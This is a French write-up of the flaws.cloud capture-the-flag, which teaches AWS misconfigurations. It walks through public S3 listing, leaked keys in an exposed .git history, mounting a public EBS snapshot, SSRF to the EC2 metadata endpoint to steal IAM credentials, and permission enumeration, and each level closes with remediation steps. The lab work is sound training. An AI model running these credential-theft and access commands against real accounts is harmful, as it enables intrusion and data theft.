# flaws.cloud - Write-up Complet

CTF créé par **Scott Piper** ([@0xdabbad00](https://twitter.com/0xdabbad00)) pour apprendre les erreurs de sécurité AWS courantes.

**URL:** http://flaws.cloud/

---

## Table des matières

1. [Level 1 - S3 Bucket Public](#level-1---s3-bucket-public)
2. [Level 2 - Any Authenticated AWS User](#level-2---any-authenticated-aws-user)
3. [Level 3 - Git Leak](#level-3---git-leak)
4. [Level 4 - Snapshot EBS Public](#level-4---snapshot-ebs-public)
5. [Level 5 - SSRF et Métadonnées EC2](#level-5---ssrf-et-métadonnées-ec2)
6. [Level 6 - SecurityAudit Policy](#level-6---securityaudit-policy)
7. [Récapitulatif des vulnérabilités](#récapitulatif)

---

## Level 1 - S3 Bucket Public

### Contexte
Le site flaws.cloud est hébergé sur un bucket S3. L'objectif est de trouver un fichier secret.

### Vulnérabilité
**Le bucket S3 a le listing public activé** - n'importe qui peut voir tous les fichiers.

### Exploitation

#### Étape 1 : Identifier que c'est un bucket S3

**Comment savoir que c'est du S3 ?**

```bash
nslookup flaws.cloud
```
**Résultat:**
```
Address: 52.92.240.227
Address: 52.218.180.34
Address: 3.5.81.51
...
```

**Indices:**
- Les IPs `52.x.x.x` et `3.5.x.x` appartiennent aux plages AWS
- Un site statique sur AWS est souvent hébergé sur S3
- Le nom de domaine `flaws.cloud` ressemble au format des buckets S3 (les buckets peuvent être accédés via `bucket-name.s3.amazonaws.com`)

#### Étape 2 : Trouver la région

**Pourquoi la région est-elle nécessaire ?**

AWS S3 est un service **régional**. Chaque bucket existe dans une région spécifique. Pour interagir avec un bucket via AWS CLI, la région doit être connue (sinon des erreurs ou redirections peuvent survenir).

**Comment trouver la région ?**

Un reverse DNS sur une des IPs révèle l'information :
```bash
nslookup 52.92.240.227
```
**Résultat:**
```
227.240.92.52.in-addr.arpa    name = s3-website-us-west-2.amazonaws.com
```

Le nom d'hôte contient `us-west-2` → c'est la région.

**Alternative:** Les headers HTTP peuvent aussi contenir l'information :
```bash
curl -I http://flaws.cloud/
# Le header "x-amz-bucket-region" indique parfois la région
```

#### Étape 3 : Lister le bucket

**Comment savoir si le listing est possible ?**

Il suffit de tester. C'est une erreur de configuration courante. Le flag `--no-sign-request` permet de faire une requête **anonyme** (sans credentials AWS).

```bash
aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2
```

**Résultat:**
```
2017-03-14 04:00:38       2575 hint1.html
2017-03-03 05:05:17       1707 hint2.html
2017-03-03 05:05:11       1101 hint3.html
2024-02-22 03:32:41       2861 index.html
2017-02-27 02:59:28         46 robots.txt
2017-02-27 02:59:30       1051 secret-dd02c7c.html  ← FICHIER SECRET
```

**Si le listing n'était pas public**, le message `Access Denied` serait retourné.

#### Étape 4 : Accéder au secret
```bash
curl http://flaws.cloud/secret-dd02c7c.html
```
→ Lien vers Level 2

### Explication technique

**Pourquoi `--no-sign-request` fonctionne-t-il ?**

Par défaut, AWS CLI signe toutes les requêtes avec des credentials. Avec `--no-sign-request`, la requête est envoyée sans signature = anonyme.

Si le bucket a l'ACL "Everyone: List" ou une bucket policy qui autorise `"Principal": "*"`, alors les requêtes anonymes fonctionnent.

**Comment vérifier les permissions d'un bucket (si l'accès le permet) ?**
```bash
aws s3api get-bucket-acl --bucket flaws.cloud
aws s3api get-bucket-policy --bucket flaws.cloud
```

### Remédiation
- Ne jamais activer le listing public sur un bucket S3
- Utiliser des bucket policies restrictives
- Activer "Block Public Access" dans les paramètres S3

---

## Level 2 - Any Authenticated AWS User

### Contexte
URL: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud

### Vulnérabilité
**Le bucket est accessible à "Any Authenticated AWS User"** - une permission souvent mal comprise.

### Exploitation

#### Étape 1 : Tester l'accès anonyme

**Réflexe : toujours tester d'abord en anonyme**
```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/ --no-sign-request --region us-west-2
```
**Résultat:** `Access Denied`

**Interprétation :**
- `Access Denied` = pas d'accès public
- Cela ne signifie pas que le bucket est sécurisé
- D'autres permissions peuvent être mal configurées

#### Étape 2 : Tester avec des credentials AWS

**Pourquoi essayer avec des credentials ?**

Il existe une permission AWS appelée **"Any Authenticated AWS User"**. C'est un piège classique :
- Les administrateurs pensent que cela signifie "les utilisateurs de MON compte AWS"
- En réalité, cela autorise **TOUS les comptes AWS dans le monde** (des millions)

**Test :**

Configurer n'importe quel compte AWS (même un compte free tier personnel) :
```bash
aws configure
# Entrer l'Access Key ID
# Entrer le Secret Access Key
# Région: us-west-2
```

Puis lister SANS `--no-sign-request` :
```bash
aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/ --region us-west-2
```

**Résultat:**
```
2017-02-27 03:02:15      80751 everyone.png
2017-03-03 04:47:17       1433 hint1.html
2017-02-27 03:04:39       1035 hint2.html
2017-02-27 03:02:14       2786 index.html
2017-02-27 03:02:14         26 robots.txt
2017-02-27 03:02:15       1051 secret-e4443fc.html  ← FICHIER SECRET
```

**Cela fonctionne avec n'importe quel compte AWS.**

#### Comment identifier cette permission ?

**Déduction par le comportement :**
1. Accès anonyme (`--no-sign-request`) → `Access Denied`
2. Accès avec credentials AWS quelconques → Succès

**Confirmation (si les droits de lecture sur la policy existent) :**
```bash
aws s3api get-bucket-acl --bucket level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
```
La réponse contiendrait :
```json
{
  "Grantee": {
    "Type": "Group",
    "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
  },
  "Permission": "READ"
}
```

### Remédiation
- Ne jamais utiliser "Any Authenticated AWS User"
- Utiliser des policies IAM explicites avec des ARN spécifiques
- Exemple de bonne policy :
```json
{
  "Principal": {"AWS": "arn:aws:iam::123456789012:user/specific-user"}
}
```

---

## Level 3 - Git Leak

### Contexte
URL: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

### Vulnérabilité
**Un dossier .git est exposé publiquement**, contenant des credentials AWS dans l'historique.

### Exploitation

#### Étape 1 : Lister le bucket

**Réflexe : toujours commencer par lister**
```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ --region us-west-2
```

**Résultat:**
```
                           PRE .git/     ← DOSSIER GIT EXPOSÉ
2017-02-27 01:14:33     123637 authenticated_users.png
2017-02-27 01:14:34       1552 hint1.html
...
```

**Pourquoi c'est intéressant ?**

`.git/` est le dossier qui contient tout l'historique d'un repository Git. Il ne devrait JAMAIS être exposé publiquement car il contient :
- Tout l'historique des commits
- Les fichiers supprimés (qui restent dans l'historique)
- Potentiellement des secrets commitées par erreur

#### Étape 2 : Télécharger le repo

**Pourquoi télécharger tout le dossier ?**

Pour pouvoir utiliser les commandes git localement et explorer l'historique.

```bash
cd /tmp && mkdir level3 && cd level3
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --region us-west-2
```

`aws s3 sync` télécharge récursivement tous les fichiers.

#### Étape 3 : Analyser l'historique git

**Comment chercher des secrets dans un repo git ?**

D'abord, examiner l'historique des commits :
```bash
git log
```

**Résultat:**
```
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
    Oops, accidentally added something I shouldn't have  ← MESSAGE SUSPECT

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
    first commit
```

**Indicateur de problème :**

Le message "Oops, accidentally added something I shouldn't have" est un énorme red flag. Cela suggère que quelque chose a été ajouté puis supprimé.

#### Étape 4 : Voir ce qui a été supprimé

**Comment voir le contenu d'un ancien commit ?**

```bash
git show f52ec03b227ea6094b04e43f475fb0126edb5a61
```

Ou comparer deux commits :
```bash
git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
```

**Résultat:**
```diff
+++ b/access_keys.txt
+access_key AKIAXXXXXXXXXXXXX
+secret_access_key [REDACTED_SECRET_KEY]
```

Des credentials AWS sont présentes dans le premier commit, supprimées dans le second.

#### Étape 5 : Utiliser les credentials trouvées

**Comment savoir si ces credentials sont utiles ?**

Ce sont des credentials AWS (format `AKIA...` pour l'access key). Test :

```bash
aws configure --profile flaws
# Access Key: AKIAXXXXXXXXXXXXX
# Secret: [REDACTED_SECRET_KEY]
# Région: us-west-2

# Vérifier l'identité
aws sts get-caller-identity --profile flaws
```

**Résultat:**
```json
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

L'utilisateur `backup` du compte `975426262029` (le compte flaws.cloud) est maintenant accessible.

```bash
aws s3 ls --profile flaws
```

**Résultat:** Liste de TOUS les buckets du compte flaws.

### Outils automatiques pour trouver des secrets dans git

```bash
# truffleHog - scanne l'historique git pour des secrets
pip install truffleHog
trufflehog git file://./

# git-secrets - prévient les commits de secrets
brew install git-secrets
git secrets --scan-history
```

### Remédiation
1. **Ne jamais commit de secrets** - utiliser des variables d'environnement
2. **Utiliser .gitignore** pour exclure les fichiers sensibles
3. **Utiliser git-secrets** ou **truffleHog** pour scanner les repos
4. **Si des secrets sont commitées** : les révoquer immédiatement (ne pas juste les supprimer)
5. **Ne pas exposer .git/** sur les serveurs web ou S3

---

## Level 4 - Snapshot EBS Public

### Contexte
URL: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud

Le site indique qu'il faut accéder à `4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud` qui est protégé par mot de passe (nginx). L'indice : un snapshot a été fait après l'installation de nginx.

### Vulnérabilité
**Un snapshot EBS est public**, permettant à n'importe qui de le monter et extraire des données.

### Exploitation

#### Étape 1 : Comprendre le contexte

**Qu'est-ce qu'un snapshot EBS ?**

EBS (Elastic Block Store) = disques durs virtuels pour les instances EC2.
Un snapshot = une sauvegarde/copie d'un volume EBS à un instant T.

Les snapshots peuvent être :
- Privés (par défaut)
- Partagés avec des comptes spécifiques
- **Publics** (erreur de configuration)

#### Étape 2 : Trouver le snapshot

**Comment savoir qu'il faut chercher un snapshot ?**

L'énoncé dit "a snapshot was made" - c'est l'indice direct.

**Comment trouver les snapshots d'un compte AWS ?**

L'ID du compte est nécessaire. Il a été trouvé au Level 3 : `975426262029`

```bash
aws ec2 describe-snapshots --owner-ids 975426262029 --profile flaws --region us-west-2
```

**Résultat:**
```json
{
    "SnapshotId": "snap-0b49342abd1bdcb89",
    "VolumeSize": 8,
    "Encrypted": false,
    "Description": "flaws backup 2017.02.27",
    "State": "completed"
}
```

**Comment savoir si ce snapshot est public ?**

Tester avec un autre compte AWS (pas le profil flaws) :
```bash
aws ec2 describe-snapshots --snapshot-ids snap-0b49342abd1bdcb89 --region us-west-2
```
Si cela fonctionne, le snapshot est public ou partagé.

#### Étape 3 : Exploiter le snapshot

**Pourquoi un snapshot public est-il exploitable ?**

N'importe qui peut :
1. Créer un volume à partir du snapshot
2. Attacher ce volume à une de ses propres instances EC2
3. Monter le volume et lire tous les fichiers

**Étapes détaillées :**

```bash
# 1. Créer un volume à partir du snapshot (dans son propre compte AWS)
aws ec2 create-volume \
  --snapshot-id snap-0b49342abd1bdcb89 \
  --availability-zone us-west-2a \
  --region us-west-2
# Noter le VolumeId retourné (ex: vol-038a8e8a974242f33)

# 2. Créer une instance EC2 pour monter le volume
aws ec2 create-key-pair --key-name flaws-key --query 'KeyMaterial' \
  --output text --region us-west-2 > ~/.ssh/flaws-key.pem
chmod 400 ~/.ssh/flaws-key.pem

aws ec2 run-instances \
  --image-id ami-0735c191cf914754d \
  --instance-type t2.micro \
  --key-name flaws-key \
  --placement AvailabilityZone=us-west-2a \
  --region us-west-2
# Noter l'InstanceId

# 3. Ouvrir le port SSH
aws ec2 authorize-security-group-ingress \
  --group-id sg-XXXXX \
  --protocol tcp --port 22 --cidr 0.0.0.0/0 \
  --region us-west-2

# 4. Attacher le volume
aws ec2 attach-volume \
  --volume-id vol-XXXXX \
  --instance-id i-XXXXX \
  --device /dev/xvdf \
  --region us-west-2

# 5. Se connecter et monter
ssh -i ~/.ssh/flaws-key.pem ubuntu@<IP_PUBLIQUE>
```

Une fois connecté :
```bash
# Voir les disques
lsblk

# Monter le volume
sudo mkdir /mnt/flaws
sudo mount /dev/xvdf1 /mnt/flaws

# Chercher les credentials nginx
cat /mnt/flaws/home/ubuntu/setupNginx.sh
```

**Résultat:**
```bash
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
```

**Où chercher les credentials ?**

- `/etc/nginx/.htpasswd` = fichier standard pour l'authentification nginx
- `/home/ubuntu/` = scripts d'installation souvent laissés par les administrateurs
- Recherche générale : `grep -r "password" /mnt/flaws/`

#### Étape 4 : Nettoyer

**IMPORTANT : Supprimer les ressources pour éviter les frais**

```bash
aws ec2 terminate-instances --instance-ids i-XXXXX --region us-west-2
# Attendre que l'instance soit terminée
aws ec2 delete-volume --volume-id vol-XXXXX --region us-west-2
aws ec2 delete-key-pair --key-name flaws-key --region us-west-2
rm ~/.ssh/flaws-key.pem
```

### Remédiation
1. **Ne jamais rendre les snapshots publics**
2. **Chiffrer les volumes EBS** - les snapshots seront aussi chiffrés et ne peuvent pas être partagés publiquement
3. **Ne pas stocker de credentials en clair** dans les scripts
4. **Auditer régulièrement** les ressources publiques avec AWS Config ou des outils comme ScoutSuite

---

## Level 5 - SSRF et Métadonnées EC2

### Contexte
URL: http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/

### Vulnérabilité
**SSRF (Server-Side Request Forgery)** permettant d'accéder aux métadonnées EC2 (169.254.169.254).

### Exploitation

#### Étape 1 : Découvrir le proxy

**Comment identifier un proxy ?**

En explorant le site du Level 4, un endpoint `/proxy/` est découvert. Il permet de faire des requêtes HTTP vers d'autres URLs.

Test :
```bash
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/example.com/
```

Le serveur fetch le contenu de example.com et le renvoie.

#### Étape 2 : Comprendre l'attaque SSRF

**Qu'est-ce qu'une SSRF ?**

SSRF = Server-Side Request Forgery
- L'attaquant fait faire une requête au SERVEUR (pas à lui-même)
- Le serveur peut accéder à des ressources internes inaccessibles depuis l'extérieur

**Pourquoi c'est dangereux sur AWS ?**

Toutes les instances EC2 peuvent accéder à une IP spéciale : `169.254.169.254`
Cette IP fournit des **métadonnées** sur l'instance :
- Hostname, IP, région
- **Credentials IAM temporaires** du rôle attaché à l'instance

#### Étape 3 : Accéder aux métadonnées

**D'où vient l'IP 169.254.169.254 ?**

Cette IP est une **connaissance fondamentale en sécurité cloud**. Voici pourquoi :

1. **Plage link-local (169.254.0.0/16)** : Cette plage IP est réservée par l'IANA pour les communications locales uniquement. Elle n'est pas routable sur Internet.

2. **Standard cloud industry** : Tous les grands cloud providers utilisent `169.254.169.254` pour leur service de métadonnées :
   - **AWS** : EC2 Instance Metadata Service (IMDS)
   - **Google Cloud** : Metadata Server
   - **Azure** : Instance Metadata Service
   - **DigitalOcean**, **Oracle Cloud**, etc.

3. **Documentation officielle AWS** : L'adresse est documentée publiquement dans la [documentation AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)

4. **Réflexe pentest cloud** : Lors d'un test d'intrusion sur une infrastructure cloud, la première chose à tester en cas de SSRF est l'accès à `169.254.169.254`. C'est dans toutes les checklists de sécurité cloud (OWASP, SANS, etc.).

**Comment découvrir cette IP sans la connaître au préalable ?**

- Recherche Google : "AWS metadata IP" ou "cloud metadata endpoint"
- Documentation AWS EC2
- Checklists SSRF (ex: PayloadsAllTheThings sur GitHub)
- Formation en sécurité cloud

**Comment connaître la structure de l'API des métadonnées ?**

L'API des métadonnées EC2 est documentée par AWS. Structure :
```
http://169.254.169.254/latest/meta-data/           → infos générales
http://169.254.169.254/latest/meta-data/iam/       → infos IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/  → liste des rôles
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>  → credentials
```

**Exploitation :**

```bash
# 1. Trouver le nom du rôle IAM
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Résultat:** `flaws`

```bash
# 2. Récupérer les credentials temporaires
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
```

**Résultat:**
```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-01-31T18:18:01Z"
}
```

**Nature de ces credentials :**

Ce sont des credentials **temporaires** (STS) :
- Générées automatiquement par AWS pour le rôle IAM de l'instance
- Expirent après quelques heures
- Nécessitent le `Token` en plus de l'AccessKey et SecretKey

#### Étape 4 : Utiliser les credentials

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN="..."   # IMPORTANT : le token est obligatoire

aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ --region us-west-2
```

**Pourquoi utiliser des variables d'environnement ?**

Les credentials temporaires (avec Token) sont plus faciles à utiliser via variables d'environnement qu'avec `aws configure`.

### IMDSv1 vs IMDSv2

**Pourquoi cette attaque fonctionne-t-elle ?**

L'instance utilise **IMDSv1** (Instance Metadata Service version 1) :
- Pas d'authentification
- Simple requête HTTP GET = accès aux métadonnées

**IMDSv2** est plus sécurisé :
- Requiert d'abord un token (requête PUT)
- Le token doit être passé en header
- Les proxys HTTP ne peuvent pas facilement relayer cela

```bash
# IMDSv2 - plus difficile à exploiter via SSRF
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### Remédiation
1. **Bloquer l'accès à 169.254.169.254** dans les applications (firewall, validation d'URL)
2. **Utiliser IMDSv2** (requiert un token, plus sécurisé)
3. **Valider les URLs** avant de les fetch (whitelist de domaines autorisés)
4. **Restreindre les rôles IAM** au minimum nécessaire

---

## Level 6 - SecurityAudit Policy

### Contexte
Des credentials avec la policy **SecurityAudit** sont fournies :
- Access Key: `AKIAYYYYYYYYYYYYY`
- Secret: `[REDACTED_SECRET_KEY]`

### Vulnérabilité
**Les permissions read-only permettent de cartographier l'environnement** et trouver des ressources cachées.

### Exploitation

#### Étape 1 : Identifier l'utilisateur

**Toujours commencer par identifier l'identité courante**

```bash
export AWS_ACCESS_KEY_ID=AKIAYYYYYYYYYYYYY
export AWS_SECRET_ACCESS_KEY=[REDACTED_SECRET_KEY]

aws sts get-caller-identity
```
**Résultat:**
```json
{
    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/Level6"
}
```

L'utilisateur est `Level6`.

#### Étape 2 : Énumérer les permissions

**Comment savoir ce qui est possible ?**

Lister les policies attachées à l'utilisateur :
```bash
aws iam list-attached-user-policies --user-name Level6
```
**Résultat:**
```json
{
    "AttachedPolicies": [
        {"PolicyName": "MySecurityAudit", "PolicyArn": "..."},
        {"PolicyName": "list_apigateways", "PolicyArn": "..."}
    ]
}
```

**Interprétation :**
- `MySecurityAudit` : permet de lire les configurations IAM, EC2, etc.
- `list_apigateways` : permet de lister les API Gateway → **indice important**

#### Étape 3 : Explorer les ressources

**Pourquoi chercher des Lambda et API Gateway ?**

L'indice `list_apigateways` suggère qu'il y a quelque chose d'intéressant côté API Gateway.

```bash
# Lister les fonctions Lambda
aws lambda list-functions --region us-west-2
```
**Résultat:**
```json
{
    "Functions": [{
        "FunctionName": "Level6",
        "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6"
    }]
}
```

Une Lambda nommée `Level6` existe.

#### Étape 4 : Comprendre comment la Lambda est exposée

**Comment trouver l'URL de la Lambda ?**

Les Lambda sont souvent exposées via API Gateway. Examiner la policy de la Lambda :

```bash
aws lambda get-policy --function-name Level6 --region us-west-2
```
**Résultat (formaté):**
```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Service": "apigateway.amazonaws.com"},
    "Action": "lambda:InvokeFunction",
    "Condition": {
      "ArnLike": {
        "AWS:SourceArn": "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
      }
    }
  }]
}
```

**Lecture de cette policy :**
- La Lambda peut être invoquée par API Gateway
- L'API Gateway ID est `s33ppypa75`
- Le path est `/level6`
- La méthode est `GET`

#### Étape 5 : Trouver le stage de l'API

**Qu'est-ce qu'un stage ?**

API Gateway utilise des "stages" (Prod, Dev, Test...) dans l'URL :
`https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<path>`

```bash
aws apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2
```
**Résultat:**
```json
{
    "item": [{"stageName": "Prod"}]
}
```

Le stage est `Prod`.

#### Étape 6 : Construire et appeler l'URL

**Format de l'URL API Gateway :**
```
https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<path>
```

Donc :
```bash
curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
```
**Résultat:**
```
"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
```

### Remédiation
1. **Principe du moindre privilège** - même pour les permissions read-only
2. **Auditer qui a accès** à SecurityAudit et autres policies de lecture
3. **Surveiller les appels API** avec CloudTrail
4. **Ne pas exposer d'informations sensibles** dans les noms de ressources ou configurations

---

## Récapitulatif

| Level | Vulnérabilité | Comment l'identifier | Exploitation |
|-------|--------------|----------------------|--------------|
| 1 | S3 listing public | `aws s3 ls --no-sign-request` fonctionne | Lister et accéder aux fichiers |
| 2 | "Any Authenticated AWS User" | Anonyme échoue, mais n'importe quel compte AWS fonctionne | Utiliser des credentials quelconques |
| 3 | .git exposé + secrets dans historique | `.git/` visible dans le listing | `git log`, `git show` |
| 4 | Snapshot EBS public | `describe-snapshots` avec l'owner-id | Monter le snapshot, lire les fichiers |
| 5 | SSRF → métadonnées EC2 | Proxy qui fetch des URLs | Accéder à 169.254.169.254 |
| 6 | SecurityAudit trop permissif | Énumérer les policies et ressources | Trouver l'API Gateway cachée |

---

## Commandes AWS utiles

```bash
# Authentification et identité
aws configure                              # Configurer credentials
aws configure --profile nom                # Créer un profil nommé
aws sts get-caller-identity                # Identifier l'utilisateur courant

# S3
aws s3 ls s3://bucket/                     # Lister un bucket
aws s3 ls s3://bucket/ --no-sign-request   # Sans auth (anonyme)
aws s3 cp s3://bucket/file -               # Télécharger vers stdout
aws s3 sync s3://bucket/ ./local/          # Télécharger tout

# IAM
aws iam list-users                         # Lister les utilisateurs
aws iam list-attached-user-policies --user-name X
aws iam get-policy --policy-arn X
aws iam get-policy-version --policy-arn X --version-id v1

# EC2
aws ec2 describe-instances
aws ec2 describe-snapshots --owner-ids X
aws ec2 describe-volumes

# Lambda
aws lambda list-functions
aws lambda get-policy --function-name X
aws lambda get-function --function-name X

# API Gateway
aws apigateway get-rest-apis
aws apigateway get-stages --rest-api-id X
aws apigateway get-resources --rest-api-id X

# Credentials temporaires (variables d'environnement)
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...               # Obligatoire pour STS
```

---

## Outils de sécurité AWS

| Outil | Description |
|-------|-------------|
| [ScoutSuite](https://github.com/nccgroup/ScoutSuite) | Audit multi-cloud |
| [Prowler](https://github.com/prowler-cloud/prowler) | Audit de sécurité AWS |
| [Pacu](https://github.com/RhinoSecurityLabs/pacu) | Framework d'exploitation AWS |
| [truffleHog](https://github.com/trufflesecurity/trufflehog) | Recherche de secrets dans git |
| [git-secrets](https://github.com/awslabs/git-secrets) | Prévention de commit de secrets |
